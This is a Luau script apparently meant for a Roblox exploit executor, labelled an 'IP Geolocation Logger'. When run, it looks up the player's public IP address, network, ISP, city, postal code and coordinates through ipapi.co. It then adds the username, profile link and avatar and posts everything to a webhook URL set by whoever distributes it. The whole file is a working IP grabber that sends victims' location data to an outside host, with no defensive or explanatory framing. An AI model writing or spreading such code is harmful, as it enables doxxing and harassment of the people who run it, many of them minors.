local httpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer

local avatarSuccess, avatarUrl = pcall(function()
	local thumbnailsResponse = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false")

	return httpService:JSONDecode(thumbnailsResponse).data[1].imageUrl
end)

local geolocationSuccess, geolocationData = pcall(function()
	local ipapiResponse = game:HttpGet("https://ipapi.co/json/")

	return httpService:JSONDecode(ipapiResponse)
end)
geolocationData = geolocationSuccess and geolocationData or {}

local function addField(name, value)
	return {
		name = name,
		value = geolocationData[value] and tostring(geolocationData[value]) or "Not Found"
	}
end

local payload = {
	embeds = {
		{
			color = 1733608,
			fields = {
				addField("IP Address", "ip"),
				addField("Network Range", "network"),
				addField("ASN (Autonomous System Number)", "asn"),
				addField("ISP (Internet Service Provider)", "org"),
				addField("Country", "country_name"),
				addField("Region/Province", "region"),
				addField("City", "city"),
				addField("Postal Code", "postal"),
				addField("Latitude", "latitude"),
				addField("Longitude", "longitude"),
				addField("Timezone", "timezone")
			}
		},
		{
			title = "View " .. player.Name .. "'s full profile",
			url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
			color = 1733608,
			image = {
				url = avatarSuccess and avatarUrl or "https://i.ibb.co.com/mVYFTK2f/Avatar-Not-Found.png"
			}
		}
	},
	username = "IP Geolocation Logger",
	avatar_url = "https://i.ibb.co.com/spwWKyBW/Globe-With-Meridians.png"
}

pcall(function()
	local sendRequest = request or http_request or (http and http.request)

	sendRequest({
		Url = getgenv().WebhookURL,
		Method = "POST",
		Body = httpService:JSONEncode(payload),
		Headers = {
			["Content-Type"] = "application/json"
		}
	})
end)
